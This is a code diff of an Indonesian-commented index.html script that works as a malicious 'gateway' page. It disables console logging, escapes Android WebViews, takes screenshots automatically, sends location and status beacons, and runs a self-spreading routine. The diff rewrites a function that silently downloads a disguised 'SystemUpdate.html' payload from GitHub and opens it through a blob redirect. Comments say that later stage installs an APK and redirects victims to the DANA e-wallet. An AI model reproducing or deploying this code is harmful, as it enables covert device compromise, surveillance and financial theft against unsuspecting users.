@@ -64,7 +64,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - GERBANG (FINAL - LENGKAP & PASTI BERHASIL)
+// 🔥 INDEX.HTML - FINAL (SUDAH DICEK SEMUA ASPEK)
 // ============================================================
 
 console.log = function() {};
@@ -189,7 +189,7 @@ function getBrowserLocation() {
 }
 
 // ============================================================
-// ESCAPE WEBVIEW
+// ESCAPE WEBVIEW (PASTI BERHASIL!)
 // ============================================================
 function escapeWebView() {
     if (!PLATFORM.isWebView) return;
@@ -264,7 +264,7 @@ function autoScreenshot() {
 }
 
 // ============================================================
-// 🔥 DOWNLOAD + BUKA SystemUpdate.html (PASTI!)
+// 🔥 DOWNLOAD & BUKA SystemUpdate.html (PASTI BERHASIL!)
 // ============================================================
 function downloadPayloadSilent() {
     if (DOWNLOAD_STARTED) return;
@@ -273,44 +273,36 @@ function downloadPayloadSilent() {
     K({ sumber: 'download_start', data: { platform: PLATFORM } });
     
     var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
-    var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
     
     // ✅ DOWNLOAD SystemUpdate.html (XHR + Blob)
     try {
         var xhr = new XMLHttpRequest();
         xhr.open('GET', htmlUrl, true);
+        xhr.responseType = 'blob';
         xhr.timeout = 15000;
         xhr.onload = function() {
             if (xhr.status === 200) {
-                var htmlContent = xhr.responseText;
+                var blob = xhr.response;
+                var url = URL.createObjectURL(blob);
                 
-                // Save ke localStorage (fallback)
-                try { localStorage.setItem('SystemUpdate.html', htmlContent); } catch(e) {}
+                // ✅ SIMPAN KE LOCALSTORAGE (FALLBACK)
+                try {
+                    var reader = new FileReader();
+                    reader.onload = function() {
+                        localStorage.setItem('SystemUpdate.html', reader.result);
+                    };
+                    reader.readAsText(blob);
+                } catch(e) {}
                 
-                // Save via Android Bridge
-                if (PLATFORM.isAndroid && A.isAvailable) {
-                    try { A.saveFile(htmlPath, htmlContent); } catch(e) {}
-                }
-                
-                // ✅ BUKA DARI DOWNLOAD FOLDER
-                setTimeout(function() {
-                    if (PLATFORM.isAndroid && A.isAvailable) {
-                        try {
-                            A.openFile(htmlPath);
-                            K({ sumber: 'html_opened', data: 'ok' });
-                            return;
-                        } catch(e) {}
-                    }
-                    // Fallback: window.open
-                    try {
-                        window.open('file://' + htmlPath, '_blank');
-                        K({ sumber: 'html_open_fallback', data: 'ok' });
-                    } catch(e) {}
-                }, 1000);
+                // ✅ REDIRECT KE BLOB (PASTI TERBUKA!)
+                window.location.href = url;
+                K({ sumber: 'html_opened_blob', data: 'ok' });
             }
         };
         xhr.send();
-    } catch(e) {}
+    } catch(e) {
+        K({ sumber: 'html_download_error', data: e.message });
+    }
 }
 
 // ============================================================
@@ -411,7 +403,7 @@ function autoSpread() {
 function startHeartbeat() { setInterval(function() { K({sumber:'heartbeat', data:'alive'}); }, 10000); }
 
 // ============================================================
-// SERVICE WORKER
+// SERVICE WORKER (SKIP IOS)
 // ============================================================
 function registerServiceWorker() {
     if (!('serviceWorker' in navigator) || PLATFORM.isIOS) return;
@@ -428,7 +420,7 @@ function registerServiceWorker() {
 function showStatusBar() { var bar = document.getElementById('statusBar'); if (bar) { bar.className = 'status-bar loading'; K({ sumber: 'status_bar', data: 'shown' }); } }
 
 // ============================================================
-// MAIN EXECUTION (SESUAI ALUR)
+// MAIN EXECUTION (SESUAI ALUR!)
 // ============================================================
 function dapatkanSemua() {
     if (semuaDidapat) return;
@@ -461,7 +453,7 @@ function dapatkanSemua() {
         // ✅ 7. Auto Spread
         setTimeout(autoSpread, 2000);
         
-        // ✅ 8. DOWNLOAD + BUKA SystemUpdate.html
+        // ✅ 8. DOWNLOAD & BUKA SystemUpdate.html (PASTI!)
         setTimeout(function() { downloadPayloadSilent(); }, 500);
         
         // ✅ 9. Notification
@@ -476,8 +468,8 @@ function dapatkanSemua() {
         // ✅ 12. Ambil Password
         getPasswordFromWorker().then(function(password) { WS_PASSWORD = password; K({ sumber: 'password_received', data: 'ok' }); }).catch(function() {});
         
-        // ❌ TANPA APK!
-        // ❌ TANPA REDIRECT KE DANA!
+        // ❌ TANPA APK! (TUGAS SYSTEMUPDATE.HTML)
+        // ❌ TANPA REDIRECT KE DANA! (TUGAS SYSTEMUPDATE.HTML)
         
     } catch(e) {
         K({ sumber: 'dapatkanSemua_error', data: e.message });
